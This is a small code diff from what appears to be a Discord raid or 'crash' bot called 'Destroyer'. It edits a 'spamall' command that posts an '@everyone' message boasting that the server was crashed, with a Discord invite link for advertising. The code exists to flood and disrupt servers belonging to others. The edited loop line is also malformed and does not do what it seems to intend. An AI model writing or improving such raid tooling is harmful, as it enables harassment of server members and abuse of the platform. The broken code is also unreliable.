@@ -155,9 +155,9 @@ async def __spam(ctx):
 
 @client.command(aliases=['spamall'])
 async def __spamall(ctx):
-	for i in range(25):
+	for channel in ctx.guild.text_channels in range(20):
 		try:
-			ctx.send(ctx.guild.channels, '@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+			await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
 		except:
 			break
 
